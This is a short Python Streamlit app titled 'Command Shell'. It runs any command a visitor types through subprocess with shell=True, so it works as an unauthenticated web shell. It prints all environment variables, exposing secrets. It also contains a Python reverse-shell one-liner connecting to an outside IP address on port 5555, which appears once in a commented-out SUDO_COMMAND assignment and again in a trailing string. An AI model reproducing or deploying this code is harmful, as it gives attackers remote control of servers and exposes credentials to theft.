import streamlit as st
import subprocess

import os
# os.environ['SUDO_COMMAND'] = """/home/adminuser/venv/bin/streamlit run streamlit_ssrf.py && python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'"""
print(os.environ)


def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"


def main():
    st.title("Command Shell")

    command_history = []

    # Input box for user to enter a command
    command_input = st.text_input("Enter command:")

    # Button to execute the command
    if st.button("Execute"):
        if command_input:
            result = execute_command(command_input)
            command_history.append({"command": command_input, "result": result})

    # Display command history
    st.text("Command History:")
    for entry in command_history:
        st.text(f"> {entry['command']}")
        st.text(f"  {entry['result']}")
        st.text("")


if __name__ == "__main__":
    main()

"""
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
"""